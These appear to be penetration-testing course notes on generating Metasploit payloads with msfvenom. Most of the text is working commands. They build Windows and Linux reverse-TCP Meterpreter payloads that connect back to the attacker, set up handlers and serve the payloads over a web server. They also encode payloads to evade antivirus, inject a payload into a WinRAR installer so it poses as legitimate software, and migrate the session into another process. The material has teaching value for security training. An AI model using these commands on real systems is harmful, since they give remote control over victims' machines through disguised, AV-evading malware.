# Payloads

## Generating Payloads with Msfvenom

### Client-Side Attacks

- **Definition**: A client-side attack is an attack vector that involves coercing a client to execute a malicious payload on their system, which then connects back to the attacker when executed.
- **Techniques**: These attacks typically utilize social engineering techniques to generate malicious documents or portable executables (PEs).
- **Vulnerability**: Client-side attacks exploit human vulnerabilities as opposed to vulnerabilities in services or software running on the target system.
- **Antivirus Considerations**: Since this attack vector involves the transfer and storage of a malicious payload on the client’s system (disk), attackers need to be mindful of AV detection.

### Msfvenom

- **What is Msfvenom?**: Msfvenom is a command-line utility used to generate and encode Metasploit Framework (MSF) payloads for various operating systems and web servers.
- **Origin**: Msfvenom combines the functionalities of two tools: `msfpayload` and `msfencode`.
- **Purpose**: We can use Msfvenom to generate a malicious Meterpreter payload that can be transferred to a target system. Once executed, it will connect back to our payload handler and provide us with remote access to the target system.

### Demo: Generating Payloads with Msfvenom

1. **List available payloads:**

    ```bash
    msfvenom --list payloads
    ```

2. **Types of Payloads:**
   - **Staged Payload**: Delivered in two parts: an initial loader that connects back to the attacker and downloads the main payload, allowing for smaller payloads and flexibility.
   - **Non-staged Payload**: Delivers the entire payload at once, making it simpler and faster but potentially larger in size.

#### Generating Windows Payloads

- **Generate x86 Payload:**

    ```bash
    msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=[yourIP] LPORT=[port] -f exe > /home/kali/Desktop/Windows_Payloads/payloadx86.exe
    ```

    Check if the payload was generated successfully:

    ```bash
    cd Desktop/Windows_Payloads/
    ls
    ```

- **Generate x64 Payload:**

    ```bash
    msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=[yourIP] LPORT=[port] -f exe > /home/kali/Desktop/Windows_Payloads/payloadx64.exe
    ```

    Verify:

    ```bash
    cd Desktop/Windows_Payloads/
    ls
    ```

- **Set up a Handler:**
    - A handler is needed to listen for and manage incoming connections from the payload on the target machine, enabling control over the compromised system:

    ```bash
    use exploit/multi/handler
    ```

- **List available output formats:**

    ```bash
    msfvenom -list formats
    ```

    - **Framework Executable Formats**: aspx, dll, elf, exe, jar, etc.
    - **Framework Transform Formats**: Allows us to output the payloads into a Python, Ruby file, etc.

#### Generating Linux Payloads

- **Navigate to the directory for Linux payloads:**

    ```bash
    cd ..
    ls
    ```

    The payloads will be stored in `/home/kali/Desktop/`.

- **Generate Payload:**

    ```bash
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[yourIP] LPORT=[port] -f elf > /Desktop/Linux_Payloads/payloadx86
    ```

    Navigate to the target directory and make the payload executable:

    ```bash
    cd Linux_Payloads/
    chmod +x payloadx86
    ./payloadx86
    ```

### Transfer Windows Payload onto Target System

- **Navigate to the Windows payloads directory:**

    ```bash
    cd Windows_Payloads/
    ```

- **Set up a simple web server to host the payload files:**

    ```bash
    sudo python -m SimpleHTTPServer 80
    ```

- **Open a new tab and launch msfconsole:**

    ```bash
    msfconsole
    ```

    - **Set up and run the handler:**

        ```bash
        use multi/handler
        set payload windows/meterpreter/reverse_tcp
        set lhost [yourIP]
        set lport [port]
        run
        ```

    - **Result**: We obtained a Meterpreter session.
 
## Encoding Payloads with Msfvenom

- **AV Detection**: Since this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be aware of antivirus (AV) detection.
- **Signature-Based Detection**: Most end-user AV solutions utilize signature-based detection to identify malicious files or executables.
- **Evading AV Solutions**: We can evade older signature-based AV solutions by encoding our payloads.
- **Encoding**: Encoding is the process of modifying the payload shellcode with the objective of altering the payload's signature to evade detection.

## Shellcode

- **Definition**: Shellcode is a piece of code typically used as a payload for exploitation.
- **Origin of the Term**: It derives its name from "command shell," where shellcode is a piece of code that provides an attacker with a remote command shell on the target system.

## Demo: Encoding Payloads with Msfvenom

### Encoding Windows Payload

1. **List available encoders:**

    ```bash
    msfvenom --list encoders
    ```

2. **Generate and encode a Windows x86 payload with Shikata:**

    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=[yourIP] LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
    ```

    Navigate to the directory:

    ```bash
    cd Windows_Payloads/
    ```

3. **Increase iterations to improve AV evasion:**

    ```bash
    rm encodedx86.exe
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=[yourIP] LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
    ```

    Verify the generated file:

    ```bash
    ls
    ```

### Encoding Linux Payload

1. **Generate and encode a Linux x86 payload:**

    ```bash
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[yourIP] LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > ~/Desktop/Linux_Payloads/encodedx86
    ```

    Navigate to the root directory and list files:

    ```bash
    cd
    ls
    cd Linux_Payloads/
    ```

### Testing Out the Exploits

1. **Navigate to the Windows payloads directory:**

    ```bash
    cd Windows_Payloads/
    ```

2. **Host a simple web server to upload the exploit files:**

    ```bash
    sudo python -m SimpleHTTPServer 80
    ```

3. **Set up the Listener in a new tab:**

    ```bash
    msfconsole
    ```

    Configure the handler:

    ```bash
    use multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST=[yourIP]
    set LPORT=1234
    show options
    run
    ```

4. **Execute the payload on the target system**:
   - On the Windows system, after uploading the payload, executing it on the target will allow us to obtain a Meterpreter session on our Kali system.
  
## Injecting Payloads Into Windows Portable Executables (Demo)

### Using `msfvenom`

We will use the `-x` option (the `-k` and `-x` options would also work).

### Objective

We are going to generate an x86 meterpreter payload and inject it into the WinRAR setup file. First, we download WinRAR.

    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=[own IP] LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe
    ```

### Checking if the Payload was Generated

We navigate to the directory where the payload was generated:

    ```bash
    cd ~/Desktop/Windows_Payloads/
    ls
    ```

We should see the `winrar.exe` payload file.

### Setting up a Web Server

To serve the payload, we set up a simple web server:

    ```bash
    sudo python -m SimpleHTTPServer 80
    ```

### Setting up a Listener (Multi-Handler)

In a new tab, we start `msfconsole`:

    ```bash
    msfconsole
    ```

We then configure the multi-handler:

    ```bash
    use multi/handler
    ```

Next, we set the payload that we used to generate the executable:

    ```bash
    set payload windows/meterpreter/reverse_tcp
    set LHOST [own IP]
    set LPORT 1234
    run
    ```

### Executing the Payload

On the Windows system, we execute the payload (the WinRAR setup file). Since we did **not** use the `-k` option, it will not start the setup process. Instead, it just executes the payload.

### Result

On the Kali system, we receive a meterpreter session.

### Process Migration

We migrate the process that the meterpreter payload is currently running on to another process (for example, `notepad.exe`):

    ```bash
    run post/windows/migrate
    ```

![grafik](https://github.com/user-attachments/assets/dbd5d1aa-d2ca-4d62-b740-9baa19f01462)

## The `-k` Option

The `-k` option maintains the functionality of the file we are injecting with a payload. However, it doesn't work on a lot of executables and requires extensive testing with different programs.

    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=[own IP] LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe
    ```
